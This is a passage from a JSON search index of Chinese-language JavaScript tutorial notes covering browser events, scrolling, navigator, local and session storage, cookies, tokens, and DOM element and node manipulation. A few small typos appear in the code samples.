history.go\",\"slug\":\"_1-7-3-history-go\",\"contents\":[\"history.go(参数)用来前进和后退，参数如果是 1 前进一个页面，如果是 -1 后退一个页面\"]},{\"header\":\"1.8 浏览器的onload事件\",\"slug\":\"_1-8-浏览器的onload事件\",\"contents\":[\"这个不再是对象了，而是一个事件，是在页面所有资源加载完毕后执行的\",\"window.onload = function () { console.log('页面已经加载完毕') } \"]},{\"header\":\"1.8.1 在html页面中把JS写在head里面\",\"slug\":\"_1-8-1-在html页面中把js写在head里面\",\"contents\":[\"<html> <head> <meta charset=\\\"UTF-8\\\" /> <script> // 这个代码执行的时候，body 还没有加载 // 这个时候我们就获取不到 body 中的那个 div // 就需要使用 window.onload 事件 window.onload = function () { // 这个函数会在页面加载完毕以后在执行 // 那么这个时候页面的 DOM 元素都已经加载了，我们就可以获取 div 了 } </script> </head> <body> <div></div> </body> </html> \"]},{\"header\":\"1.8.2 在html页面中把JS写在body最后面\",\"slug\":\"_1-8-2-在html页面中把js写在body最后面\",\"contents\":[\"<html> <head> <meta charset=\\\"UTF-8\\\" /> </head> <body> <div></div> <script> // 这个代码执行的时候，body 已经加载完毕了 // 在这里就可以获取到 div，写不写 window.onload 就无所谓了 window.onload = function () { // 这个函数会在页面加载完毕以后在执行 // 那么这个时候页面的 DOM 元素都已经加载了，我们就可以获取 div 了 } </script> </body> </html> \"]},{\"header\":\"1.9 浏览器的onscroll事件\",\"slug\":\"_1-9-浏览器的onscroll事件\",\"contents\":[\"这个 onscroll 事件是当浏览器的滚动条滚动的时候触发或者鼠标滚轮滚动的时候触发\",\"window.onscroll = function () { console.log('浏览器滚动了') } \",\"注意：前提是页面的高度要超过浏览器的可是窗口才可以\"]},{\"header\":\"1.10 浏览器滚动的距离\",\"slug\":\"_1-10-浏览器滚动的距离\",\"contents\":[\"浏览器内的内容既然可以滚动，那么我们就可以获取到浏览器滚动的距离\",\"浏览器真的滚动了吗？\",\"其实我们的浏览器是没有滚动的，是一直在那里，那么滚动的是什么？是我们的页面，所以说，其实浏览器没有动，只不过是页面向上走了，所以，这个已经不能单纯的算是浏览器的内容了，而是我们页面的内容，所以不是再用 window 对象了，而是使用 document 对象\"]},{\"header\":\"1.10.1 scrollTop\",\"slug\":\"_1-10-1-scrolltop\",\"contents\":[\"获取的是页面向上滚动的距离\",\"一共有两个获取方式\",\"document.body.scrollTop\",\"document.documentElement.scrollTop\",\"window.onscroll = function () { console.log(document.body.scrollTop) console.log(document.documentElement.scrollTop) } \",\"区别：\",\"IE 浏览器 \",\"没有 DOCTYPE 声明的时候，用这两个都行\",\"有 DOCTYPE 声明的时候，只能用 document.documentElement.scrollTop\",\"Chrome 和 FireFox \",\"没有 DOCTYPE 声明的时候，用 document.body.scrollTop\",\"有 DOCTYPE 声明的时候，用 document.documentElement.scrollTop\",\"Safari \",\"两个都不用，使用一个单独的方法 window.pageYOffset \"]},{\"header\":\"1.10.2 scrollLeft\",\"slug\":\"_1-10-2-scrollleft\",\"contents\":[\"获取页面向左滚动的距离\",\"两个方法\",\"document.body.scrollLeft\",\"document.documentElementLeft\",\"window.onscroll = function () { console.log(document.body.scrollLeft) console.log(document.documentElement.scrollLeft) } \"]},{\"header\":\"1.11 navigator对象\",\"slug\":\"_1-11-navigator对象\",\"contents\":[\"window.navigator对象，该对象下记录了浏览器自身的相关信息\",\"常用属性和方法：\",\"通过 userAgent 检测浏览器的版本及平台\",\"// 检测 userAgent（浏览器信息） (function () { var userAgent = navigator.userAgent // 验证是否为Android或iPhone var android = userAgent.match(/(Android);?[\\\\s\\\\/]+([\\\\d.]+)?/) var iphone = userAgent.match(/(iPhone\\\\sOS)\\\\s([\\\\d_]+)/) // 如果是Android或iPhone，则跳转至移动站点 if (android || iphone) { location.href = '地址' }})(); \"]},{\"header\":\"1.12 本地存储\",\"slug\":\"_1-12-本地存储\",\"contents\":[\"本地存储：将数据存储在本地浏览器中\",\"优点：\",\"页面刷新或者关闭不丢失数据，实现数据持久化\",\"容量较大，sessionStorage 和 localStorage 约 5M 左右\"]},{\"header\":\"1.12.1 localStorage\",\"slug\":\"_1-12-1-localstorage\",\"contents\":[\"作用: 数据可以长期保留在本地浏览器中，刷新页面和关闭页面，数据也不会丢失, 除非手动删除\",\"特性：可以多窗口共享（同一浏览器可以共享），以键值对的形式存储，并且存储的是字符串，省略了 window\",\"语法： 存储数据：\",\"localStorage.setItem(key, value) \",\"获取数据：\",\"localStorage.getItem(key) \",\"删除数据：\",\"localStorage.removeItem(key) \",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\"> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"> <title>本地存储-localstorage</title> </head> <body> <script> // 本地存储 - localstorage 存储的是字符串 // 1. 存储 localStorage.setItem('age', 18) // 2. 获取 console.log(typeof localStorage.getItem('age')) // 3. 删除 localStorage.removeItem('age') </script> </body> </html> \",\"可以在浏览器使用 F12，通过 Application 查看本地数据\"]},{\"header\":\"1.12.2 sessionStorage\",\"slug\":\"_1-12-2-sessionstorage\",\"contents\":[\"特性：\",\"生命周期为关闭浏览器窗口\",\"在同一个窗口（页面）下数据可以共享\",\"以键值对的形式存储使用\",\"用法跟 localStorage 基本相同\",\"语法：\",\"// 存储 sessionStorage.setItem(key,value) // 获取 sessionStorage.getItem(key) // 删除 sessionStorage.removeItem(key) \"]},{\"header\":\"1.12.3 localStorage 存储复杂数据类型\",\"slug\":\"_1-12-3-localstorage-存储复杂数据类型\",\"contents\":[\"问题：本地只能存储字符串, 无法存储复杂数据类型\",\"解决方法：需要将复杂数据类型转换成 JSON 字符串, 再存储到本地\",\"语法：JSON.stringify(复杂数据类型)\",\"JSON 字符串：\",\"首先是1个字符串\",\"属性名使用双引号引起来，不能单引号\",\"属性值如果是字符串型也必须双引号\",\"<body> <script> // 本地存储复杂数据类型 var goods = { name: '小米', price: 1999 } // localStorage.setItem('goods', goods) // console.log(localStorage.getItem('goods')) // 1. 把对象转换为JSON字符串 JSON.stringify localStorage.setItem('goods', JSON.stringify(goods)) // console.log(typeof localStorage.getItem('goods')) </script> </body> \",\"问题：因为本地存储里面取出来的是字符串，不是对象，无法直接使用\",\"解决：把取出来的字符串转换为对象\",\"语法：JSON.parse(JSON字符串)\",\"<body> <script> // 本地存储复杂数据类型 var goods = { name: '小米', price: 1999 } // localStorage.setItem('goods', goods) // console.log(localStorage.getItem('goods')) // 1. 把对象转换为JSON字符串 JSON.stringify localStorage.setItem('goods', JSON.stringify(goods)) // console.log(typeof localStorage.getItem('goods')) // 2. 把JSON字符串转换为对象 JSON.parse console.log(JSON.parse(localStorage.getItem('goods'))) </script> </body> \"]},{\"header\":\"1.13 cookie\",\"slug\":\"_1-13-cookie\",\"contents\":[\"cookie的特点:\",\"只能存储文本\",\"单条存储有大小限制4KB左右，数量限制（一般浏览器，限制大概在50条左右）\",\"读取有域名限制：不可跨域读取，只能由来自 写入cookie的 同一域名 的网页可进行读取。简单的讲就是，哪个服务器发给你的cookie，只有哪个服务器有权利读取\",\"时效限制：每个cookie都有时效，默认的有效期是，会话级别：就是当浏览器关闭，那么cookie立即销毁，但是我们也可以在存储的时候手动设置cookie的过期时间\",\"路径限制：存cookie时候可以指定路径，只允许子路径读取外层cookie，外层不能读取内层\"]},{\"header\":\"1.14 token\",\"slug\":\"_1-14-token\",\"contents\":[\"token是访问权限的令牌，本质上是一串字符串\",\"创建：正确登录后，由后端签发并返回\",\"作用：判断是否有登录状态等，控制访问权限\",\"注意：前端只能判断 token 有无，而后端才能判断 token 的有效性\",\"目标：只有登录状态，才可以访问内容页面\"]}]},\"/front-end/javascript-notes/20-JavaScript-DOM.html\":{\"title\":\"DOM\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"在JavaScript中，DOM (文档对象模型)是一种将HTML或XML文档表示为树形结构的API，它提供了访问和操作HTML或XML文档的方法\"]},{\"header\":\"1. DOM树\",\"slug\":\"_1-dom树\",\"contents\":[\"在JavaScript中，DOM (文档对象模型)是一种将HTML或XML文档表示为树形结构的API，它提供了访问和操作HTML或XML文档的方法\",\"JavaScript-DOM01.png\",\"元素节点其实就是 HTML 标签，如上图中 head、div、body 等都属于元素节点\",\"属性节点是指 HTML 标签中的属性，如上图中 a 标签的 href 属性、div 标签的 class 属性\",\"文本节点是指 HTML 标签的文字内容，如 title 标签中的文字\",\"根节点 特指 html 标签\"]},{\"header\":\"2. DOM元素节点\",\"slug\":\"_2-dom元素节点\",\"contents\":[\"元素节点是 DOM 树中的一个分支点，它包含元素标签的所有属性和内容\"]},{\"header\":\"2.1 获取元素\",\"slug\":\"_2-1-获取元素\",\"contents\":[\"通过 JS 代码来获取页面中的标签，获取到以后我们就可以操作这些标签了\"]},{\"header\":\"2.1.1 getElementById\",\"slug\":\"_2-1-1-getelementbyid\",\"contents\":[\"getElementById 是通过标签的 id 名称来获取标签的\",\"因为在一个页面中 id 是唯一的，所以获取到的就是一个元素\",\"<body> <div id=\\\"box\\\"></div> <script> // 获取到的就是页面中的那个 id 为 box 的 div 标签 var box = document.getElementById('box') console.log(box) // <div></div> </script> </body> \"]},{\"header\":\"2.1.2 getElementsByClassName\",\"slug\":\"_2-1-2-getelementsbyclassname\",\"contents\":[\"getElementsByClassName 是通过标签的 class 名称来获取标签的\",\"因为页面中可能有多个元素的 class 名称一样，所以获取到的是一组元素\",\"哪怕你获取的 class 只有一个，那也是获取一组元素，只不过这一组中只有一个 DOM 元素而已\",\"<body> <div calss=\\\"box\\\"></div> <script> var box = document.getElementsByClassName('box') console.log(box) // [<div></div>] console.log(box[0]) // <div></div> </script> </body> \",\"获取到的是一组元素，是一个长得和数组一样的数据结构，但是不是数组，是 伪数组，这组数据也是按照索引排列的，所以我们想要准确的拿到这个 div，需要用索引来获取\"]},{\"header\":\"2.1.3 getElementsByTagName\",\"slug\":\"_2-1-3-getelementsbytagname\",\"contents\":[\"getElementsByTagName 是用过标签的标签名称来获取标签的\",\"因为页面中可能有多个元素的标签名称一样，所以获取到的是一组元素\",\"哪怕只有一个这个标签名，那么也是获取一组元素，只不过这一组中只有一个 DOM 元素而已\",\"<body> <div></div> <script> var box = document.getElementsByTagName('div') console.log(box) // [<div></div>] console.log(box[0]) // <div></div> </script> </body> \",\"和 getElementsByClassName 一样，获取到的是一个长得很像数组的元素，必须要用索引才能得到准确的 DOM 元素\"]},{\"header\":\"2.1.4 querySelector\",\"slug\":\"_2-1-4-queryselector\",\"contents\":[\"querySelector 是按照选择器的方式来获取元素，也就是说，按照我们写 CSS 的时候的选择器来获取\",\"这个方法只能获取到一个元素，并且是页面中第一个满足条件的元素\",\"console.log(document.querySelector('div')) // 获取页面中的第一个 div 元素 console.log(docuemnt.querySelector('.box')) // 获取页面中第一个有 box 类名的元素 console.log(document.querySelector('#box')) // 获取页面中第一个 id 名为 box 的元素 \"]},{\"header\":\"2.1.5 querySelectorAll\",\"slug\":\"_2-1-5-queryselectorall\",\"contents\":[\"querySelectorAll 是按照选择器的方式来获取元素\",\"这个方法能获取到所有满足条件的元素，以一个伪数组的形式返回\",\"console.log(document.querySelectorAll('div')) // 获取页面中的所有的 div 元素 console.log(docuemnt.querySelectorAll('.box')) // 获取页面中所有有 box 类名的元素 \",\"获取到的是一组数据，也是需要用索引来获取到准确的每一个 DOM 元素，或者是用遍历的方式获得，没有 pop()push() 等数组方法\"]},{\"header\":\"2.1.6 获取特殊元素\",\"slug\":\"_2-1-6-获取特殊元素\",\"contents\":[\"获取body元素：doucumnet.body\",\"获取html元素：document.documentElement\"]},{\"header\":\"2.2 操作元素\",\"slug\":\"_2-2-操作元素\",\"contents\":[\"通过我们各种获取元素的方式获取到页面中的标签以后，我们可以通过操作 DOM 元素的内容和属性，就能直接把效果展示在页面上\"]},{\"header\":\"2.2.1 操作元素内容\",\"slug\":\"_2-2-1-操作元素内容\",\"contents\":[]},{\"header\":\"2.2.1.1 innerHTML\",\"slug\":\"_2-2-1-1-innerhtml\",\"contents\":[\"获取元素内部的 HTML 结构\",\"<body> <div> <p> <span>hello</span> </p> </div> <script> var div = document.querySelector('div') console.log(div.innerHTML) /* <p> <span>hello</span> </p> */ </script> </body> \",\"设置元素的内容\",\"<body> <div></div> <script> var div = document.querySelector('div') div.innerHTML = '<p>hello</p>' </script> </body> \",\"设置完以后，页面中的 div 元素里面就会嵌套一个 p 元素\"]},{\"header\":\"2.2.1.2 innerText\",\"slug\":\"_2-2-1-2-innertext\",\"contents\":[\"获取元素内部的文本（只能获取到文本内容，获取不到 html 标签）\",\"<body> <div> <p> <span>hello</span> </p> </div> <script> var div = document.querySelector('div') console.log(div.innerText) // hello </script> </body> \",\"可以设置元素内部的文本\",\"<body> <div></div> <script> var div = document.querySelector('div') div.innerText = '<p>hello</p>' </script> </body> \",\"设置完毕以后，会把 <p>hello</p> 当作一个文本出现在 div 元素里面，而不会把 p 解析成标签\"]},{\"header\":\"2.2.2 操作元素常用属性\",\"slug\":\"_2-2-2-操作元素常用属性\",\"contents\":[\"语法：\",\"对象.属性 = 值 \",\"例：\",\"<img src=\\\"./images/1.webp\\\" alt=\\\"\\\" /> \",\"//1.获取图片元素 var img = document.querySelector('img') //2.修改图片对象的属性 img.src = './images/2.webp' img.title = '小刘' \"]},{\"header\":\"2.2.3 样式属性操作\",\"slug\":\"_2-2-3-样式属性操作\",\"contents\":[]},{\"header\":\"2.2.3.1 style\",\"slug\":\"_2-2-3-1-style\",\"contents\":[\"专门用来给元素添加 css 样式的，添加的都是行内样式\",\"任何标签都有 style 属性，通过 style 属性可以动态更改网页标签的样式，如要遇到 CSS 属性中包含字符 - 时，要将 - 去掉并将其后面的字母改成大写，转换为小驼峰命名法，如 background-color 要写成 box.style.backgroundColor\",\"<body> <div></div> <script> var div = document.querySelector('div') div.style.width = \\\"100px\\\" div.style.height = \\\"100px\\\" div.style.backgroundColor = \\\"pink\\\" console.log(div) // <div style=\\\"width: 100px; height: 100px; background-color: pink;\\\"></div> </script> </body> \",\"页面中的 div 就会变成一个宽高都是 100，背景颜色是粉色\"]},{\"header\":\"2.2.3.2 获取元素的非行间样式\",\"slug\":\"_2-2-3-2-获取元素的非行间样式\",\"contents\":[\"我们在操作 DOM 的时候，很重要的一点就是要操作元素的 css 样式，那么在操作 css 样式的时候，我们避免不了就要获取元素的样式，之前我们说过可以用 元素.style.xxx 来获取，但是这个方法只能获取到元素 行间样式，也就是写在行内的样式\",\"<style> div { width: 100px; } </style> <body> <div style=\\\"height: 100px;\\\"> <p>我是一个 p 标签</p> </div> <script> var oDiv = document.querySelector('div') console.log(oDiv.style.height) // 100px console.log(oDIv.style.width) // '' </script> </body> \",\"不管是外链式还是内嵌式，我们都获取不到该元素的样式\",\"这里我们就要使用getComputedStyle和 currentStyle方法来获取，这两个方法的作用是一样的，只不过一个在 非 IE 浏览器，一个在 IE 浏览器\"]},{\"header\":\"2.2.3.2.1 getComputedStyle（非IE使用）\",\"slug\":\"_2-2-3-2-1-getcomputedstyle-非ie使用\",\"contents\":[\"语法：window.getComputedStyle(元素, null).要获取的属性\",\"<style> div { width: 100px; } </style> <body> <div style=\\\"height: 100px;\\\"> <p>我是一个 p 标签</p> </div> <script> var oDiv = document.querySelector('div') console.log(window.getComputedStyle(oDiv).width) // 100px console.log(window.getComputedStyle(oDiv).height) // 100px </script> </body> \",\"这个方法获取行间样式和非行间样式都可以\"]},{\"header\":\"2.2.3.2.1 currentStyle（IE使用）\",\"slug\":\"_2-2-3-2-1-currentstyle-ie使用\",\"contents\":[\"语法： 元素.currentStyle.要获取的属性\",\"<style> div { width: 100px; } </style> <body> <div style=\\\"height: 100px;\\\"> <p>我是一个 p 标签</p> </div> <script> var oDiv = document.querySelector('div') console.log(oDiv.currentStyle.width) // 100px console.log(oDiv.currentStyle.height) // 100px </script> </body> \"]},{\"header\":\"2.2.3.3 className\",\"slug\":\"_2-2-3-3-classname\",\"contents\":[\"专门用来操作元素的 类名的\",\"<body> <div class=\\\"box\\\"></div> <script> var div = document.querySelector('div') console.log(div.className) // box </script> </body> \",\"也可以设置元素的类名，不过是全覆盖式的操作\",\"<body> <div class=\\\"box\\\"></div> <script> var div = document.querySelector('div') div.className = 'test' console.log(div) // <div class=\\\"test\\\"></div> </script> </body> \",\"在设置的时候，不管之前有没有类名，都会全部被设置的值覆盖\"]},{\"header\":\"2.2.3.4 classList\",\"slug\":\"_2-2-3-4-classlist\",\"contents\":[\"为了解决 className 容易覆盖以前的类名的问题，我们可以通过 classList 方式追加或删除类名\",\"语法：\",\"// 追加一个类 对象.classList.add('类名') // 删除一个类 对象.classList.remove('类名') //切换一个类 对象.classList.toggle('类名') \",\"例：\",\"<div class=\\\"box\\\">文字</div> \",\".box { width: 200px; height: 200px; color: #333; } .active { color: red; background-color: pink; } \",\"var box = document.querySelector('.box') box.classList.toggle('active') //切换类 \"]},{\"header\":\"2.2.4 自定义属性的操作\",\"slug\":\"_2-2-4-自定义属性的操作\",\"contents\":[]},{\"header\":\"2.2.4.1 getAttribute\",\"slug\":\"_2-2-4-1-getattribute\",\"contents\":[\"获取元素的某个属性（包括自定义属性）\",\"<body> <div a=\\\"100\\\" class=\\\"box\\\"></div> <script> var div = document.querySelector('div') console.log(div.getAttribute('a')) // 100 console.log(div.getAttribute('class')) // box </script> </body> \"]},{\"header\":\"2.2.4.2 setAttribute\",\"slug\":\"_2-2-4-2-setattribute\",\"contents\":[\"给元素设置一个属性（包括自定义属性）\",\"<body> <div></div> <script> var div = document.querySelector('div') div.setAttribute('a', 100) div.setAttribute('class', 'box') console.log(div) // <div a=\\\"100\\\" class=\\\"box\\\"></div> </script> </body> \"]},{\"header\":\"2.2.4.3 removeAttribute\",\"slug\":\"_2-2-4-3-removeattribute\",\"contents\":[\"直接移除元素的某个属性\",\"<body> <div a=\\\"100\\\" class=\\\"box\\\"></div> <script> var div = document.querySelector('div') div.removeAttribute('class') console.log(div) // <div a=\\\"100\\\"></div> </script> </body> \"]},{\"header\":\"2.2.5 操作H5自定义属性\",\"slug\":\"_2-2-5-操作h5自定义属性\",\"contents\":[\"自定义属性目的：是为了保存并使用数据。有些数据可以保存到页面中而不用保存到数据库中\",\"自定义属性通过 getAttribute('属性') 获取，但是有些自定义属性很容易引起歧义，不容易判断是元素的内置属性还是自定义属性，H5给我们新增了自定义属性\",\"自定义属性：\",\"在 HTML 5中推出来了专门的 data-自定义属性\",\"在标签上一律以 data- 开头\",\"在 DOM 对象上一律以 dataset 对象方式获取\",\"获取自定义属性：\",\"兼容性获取：element.getAttribute('data-index')\",\"H5新增：element.dataset.index或者element.dataset['index']\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\"> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"> <title>Document</title> </head> <body> <div data-id=\\\"1\\\"> 自定义属性 </div> <script> // 1. 获取元素 let div = document.querySelector('div') // 2. 获取自定义属性值 console.log(div.dataset.id) </script> </body> </html> \"]},{\"header\":\"3. DOM节点\",\"slug\":\"_3-dom节点\",\"contents\":[]},{\"header\":\"3.1 节点的分类\",\"slug\":\"_3-1-节点的分类\",\"contents\":[\"DOM 的节点我们一般分为常用的三大类 元素节点 、文本节点 、 属性节点\"]},{\"header\":\"3.2 获取节点\",\"slug\":\"_3-2-获取节点\",\"contents\":[\"childNodes：获取某一个节点下所有的子一级节点\",\"<body> <div> <p>hello</p> </div> <script> // 这个 oDiv 获取的是页面中的 div 元素，就是一个元素节点 var oDiv = document.querySelector('div') console.log(oDiv.childNodes) /* NodeList(3) [text, p, text] 0: text 1: p 2: text length: 3 __proto__: NodeList */ </script> </body> \",\"我们会发现，拿到以后是一个伪数组，里面有三个节点：\",\"一个 text：从 <div> 一直到 <p> 中间有一个换行和一堆空格，这个是第一个节点，是一个文本节点\",\"一个 p：这个 p 标签就是第二个节点，这个是一个元素节点\",\"一个 text：从 </p> 一直到 </div> 中间有一个换行和一堆空格，这个是第三个节点，是一个文本节点\",\"children ：获取某一节点下所有的子一级元素节点\",\"<body> <div> <p>hello</p> </div> <script> // 这个 oDiv 获取的是页面中的 div 元素，就是一个元素节点 var oDiv = document.querySelector('div') console.log(oDiv.children) /* HTMLCollection [p] 0: p length: 1 __proto__: HTMLCollection */ </script> </body> \",\"我们发现只有一个节点了，因为 children 只要元素节点，div 下面又只有一个元素节点，就是 p，所以就只有一个，虽然只有一个，但是也是一个 伪数组\",\"firstChild：获取某一节点下子一级的第一个节点\",\"<body> <div> <p>hello</p> </div> <script> // 这个 oDiv 获取的是页面中的 div 元素，就是一个元素节点 var oDiv = document.querySelector('div') console.log(oDiv.firstChild) // #text </script> </body> \",\"这个是只获取一个节点，不再是伪数组了，获取的是第一个，第一个就是 <div> 一直到 <p> 的那个换行和空格，是个文本节点\",\"lastChild：获取某一节点下子一级的最后一个节点\",\"<body> <div> <p>hello</p> </div> <script> // 这个 oDiv 获取的是页面中的 div 元素，就是一个元素节点 var oDiv = document.querySelector('div') console.log(oDiv.lastChild) // #text </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是最后一个，最后一个就是 </p> 一直到 </div> 之间的换行和空格，是个文本节点\",\"firstElementChild：获取某一节点下子一级第一个元素节点\",\"<body> <div> <p>hello</p> </div> <script> // 这个 oDiv 获取的是页面中的 div 元素，就是一个元素节点 var oDiv = document.querySelector('div') console.log(oDiv.firstElementChild) // <p>hello</p> </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是第一个 元素节点，第一个元素节点就是 p 标签，是一个元素节点\",\"lastElementChild：获取某一节点下子一级最后一个元素节点\",\"<body> <div> <p>hello</p> <p>world</p> </div> <script> // 这个 oDiv 获取的是页面中的 div 元素，就是一个元素节点 var oDiv = document.querySelector('div') console.log(oDiv.lastElementChild) // <p>world</p> </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是最后一个 元素节点，最后一个元素节点是 <p>world</p>，是一个元素节点\",\"nextSibling：获取某一个节点的 下一个兄弟节点\",\"<body> <ul> <li id=\\\"a\\\">hello</li> <li id=\\\"b\\\">world</li> <li id=\\\"c\\\">!!!</li> </ul> <script> // 这个 oLi 获取的是页面中的 li 元素，就是一个元素节点 var oLi = document.querySelector('#b') console.log(oLi.nextSibling) // #text </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是 id=\\\"b\\\" 这个 li 的下一个兄弟节点，因为 id=\\\"b\\\" 的下一个节点，是两个 li 标签之间的换行和空格，所以是一个文本节点\",\"previousSibling：获取某一个节点的 上一个兄弟节点\",\"<body> <ul> <li id=\\\"a\\\">hello</li> <li id=\\\"b\\\">world</li> <li id=\\\"c\\\">!!!</li> </ul> <script> // 这个 oLi 获取的是页面中的 li 元素，就是一个元素节点 var oLi = document.querySelector('#b') console.log(oLi.previousSibling) // #text </script> </body> \",\"只获取一个节点，不在是伪数组，获取的是 id=\\\"b\\\" 这个 li 的上一个兄弟节点，因为 id=\\\"b\\\" 的上一个节点，是两个 li 标签之间的换行和空格，所以是一个文本节点\",\"nextElementSibling：获取某一个节点的下一个元素节点\",\"<body> <ul> <li id=\\\"a\\\">hello</li> <li id=\\\"b\\\">world</li> <li id=\\\"c\\\">!!!</li> </ul> <script> // 这个 oLi 获取的是页面中的 li 元素，就是一个元素节点 var oLi = document.querySelector('#b') console.log(oLi.nextElementSibling) // <li id=\\\"c\\\">!!!</li> </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是 id=\\\"b\\\" 这个 li 的下一个兄弟元素节点，因为 id=\\\"b\\\" 的下一个兄弟元素节点就是 id=\\\"c\\\" 的 li，是一个元素节点\",\"previousElementSibling：获取某一个节点的上一个元素节点\",\"<body> <ul> <li id=\\\"a\\\">hello</li> <li id=\\\"b\\\">world</li> <li id=\\\"c\\\">!!!</li> </ul> <script> // 这个 oLi 获取的是页面中的 li 元素，就是一个元素节点 var oLi = document.querySelector('#b') console.log(oLi.previousElementSibling) // <li id=\\\"a\\\">hello</li> </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是 id=\\\"b\\\" 这个 li 的上一个兄弟元素节点，因为 id=\\\"b\\\" 的上一个兄弟元素节点就是 id=\\\"a\\\" 的 li，是一个元素节点\",\"parentNode：获取某一个节点的父节点\",\"<body> <ul> <li id=\\\"a\\\">hello</li> <li id=\\\"b\\\">world</li> <li id=\\\"c\\\">!!!</li> </ul> <script> // 这个 oLi 获取的是页面中的 li 元素，就是一个元素节点 var oLi = document.querySelector('#b') console.log(oLi.parentNode) // <ul>...</ul> </script> </body> \",\"只获取一个节点，不再是伪数组，获取的是当前这个 li 的父元素节点，因为这个 li 的父亲就是 ul，所以获取到的就是 ul，是一个元素节点\",\"attributes：获取某一个 元素节点 的所有属性节点\",\"<body> <ul> <li id=\\\"a\\\" a=\\\"100\\\" test=\\\"test\\\">hello</li> </ul> <script> // 这个 oLi 获取的是页面中的 li 元素，就是一个元素节点 var oLi = document.querySelector('#a') console.log(oLi.attributes) /* NamedNodeMap {0: id, 1: a, 2: test, id: id, a: a, test: test, length: 3} 0: id 1: a 2: test length: 3 a: a id: id test: test __proto__: NamedNodeMap */ </script> </body> \",\"获取的是一组数据，是该元素的所有属性，也是一个伪数组，这个 li 有三个属性，id 、 a 、 test 三个，所以就获取到了这三个\"]},{\"header\":\"3.3 节点属性\",\"slug\":\"_3-3-节点属性\",\"contents\":[\"我们已经知道节点会分成很多种，而且我们也能获取到各种不同的节点，接下来我们就来学习各种节点之间属性的区别\",\"我们先准备一段代码\",\"<body> <ul test=\\\"我是 ul 的一个属性\\\"> <li>hello</li> </ul> <script> // 先获取 ul var oUl = document.querySelector('ul') // 获取到 ul 下的第一个子元素节点，是一个元素节点 var eleNode = oUl.firstElementChild // 获取到 ul 的属性节点组合，因为是个组合，我们要拿到节点的话要用索引 var attrNode = oUl.attributes[0] // 获取到 ul 下的第一个子节点，是一个文本节点 var textNode = oUl.firstChild </script> </body> \"]},{\"header\":\"3.3.1 nodeType\",\"slug\":\"_3-3-1-nodetype\",\"contents\":[\"nodeType：获取节点的节点类型，用数字表示\",\"console.log(eleNode.nodeType) // 1 console.log(attrNode.nodeType) // 2 console.log(textNode.nodeType) // 3 \",\"nodeType === 1 就表示该节点是一个 元素节点\",\"nodeType === 2 就表示该节点是一个 属性节点\",\"nodeType === 3 就表示该节点是一个 文本节点\"]},{\"header\":\"3.3.2 nodeName\",\"slug\":\"_3-3-2-nodename\",\"contents\":[\"nodeName：获取节点的节点名称\",\"console.log(eleNode.nodeName) // LI console.log(attrNode.nodeName) // test console.log(textNode.nodeName) // #text \",\"元素节点的 nodeName 就是 大写标签名\",\"属性节点的 nodeName 就是 属性名\",\"文本节点的 nodeName 都是 #text\"]},{\"header\":\"3.3.3 nodeValue\",\"slug\":\"_3-3-3-nodevalue\",\"contents\":[\"nodeValue： 获取节点的值\",\"console.log(eleNode.nodeValue) // null console.log(attrNode.nodeValue) // 我是 ul 的一个属性 console.log(textNode.nodeValue) // 换行 + 空格 \",\"元素节点没有 nodeValue\",\"属性节点的 nodeValue 就是 属性值\",\"文本节点的 nodeValue 就是 文本内容\"]},{\"header\":\"3.3.4 总结\",\"slug\":\"_3-3-4-总结\",\"contents\":[\"nodeType\",\"nodeName\",\"nodeValue\",\"元素节点\",\"1\",\"大写标签名\",\"null\",\"属性节点\",\"2\",\"属性名\",\"属性值\",\"文本节点\",\"3\",\"#text\",\"文本内容\"]},{\"header\":\"3.4 操作节点\",\"slug\":\"_3-4-操作节点\",\"contents\":[\"我们所说的操作无非就是 增删改查（CRUD）\",\"创建一个节点（因为向页面中增加之前，我们需要先创建一个节点出来）\",\"向页面中增加一个节点\",\"删除页面中的某一个节点\",\"修改页面中的某一个节点\",\"获取页面中的某一个节点\"]},{\"header\":\"3.4.1 创建一个节点\",\"slug\":\"_3-4-1-创建一个节点\",\"contents\":[\"createElement：用于创建一个元素节点\",\"// 创建一个 div 元素节点 var oDiv = document.createElement('div') console.log(oDiv) // <div></div> \",\"createTextNode：用于创建一个文本节点\",\"// 创建一个文本节点 var oText = document.createTextNode('我是一个文本') console.log(oText) // \\\"我是一个文本\\\" \"]},{\"header\":\"3.4.2 追加一个节点\",\"slug\":\"_3-4-2-追加一个节点\",\"contents\":[\"appendChild：是向一个元素节点的末尾追加一个节点\",\"语法： 父节点.appendChild(要插入的子节点)\",\"// 创建一个 div 元素节点 var oDiv = document.createElement('div') var oText = document.createTextNode('我是一个文本') // 向 div 中追加一个文本节点 oDiv.appendChild(oText) console.log(oDiv) // <div>我是一个文本</div> \",\"insertBefore：向某一个节点前插入一个节点\",\"语法： 父节点.insertBefore(要插入的节点，插入在哪一个节点的前面)\",\"<body> <div> <p>我是一个 p 标签</p> </div> <script> var oDiv = document.querySelector('div') var oP = oDiv.querySelector('p') // 创建一个元素节点 var oSpan = document.createElement('span') // 将这个元素节点添加到 div 下的 p 的前面 oDiv.insertBefore(oSpan, oP) console.log(oDiv) /* <div> <span></span> <p>我是一个 p 标签</p> </div> */ </script> </body> \"]},{\"header\":\"3.4.3 删除一个节点\",\"slug\":\"_3-4-3-删除一个节点\",\"contents\":[\"removeChild：移除某一节点下的某一个节点\",\"语法：父节点.removeChild(要移除的子节点)\",\"<body> <div> <p>我是一个 p 标签</p> </div> <script> var oDiv = document.querySelector('div') var oP = oDiv.querySelector('p') // 移除 div 下面的 p 标签 oDiv.removeChild(oP) console.log(oDiv) // <div></div> </script> </body> \"]},{\"header\":\"3.4.4 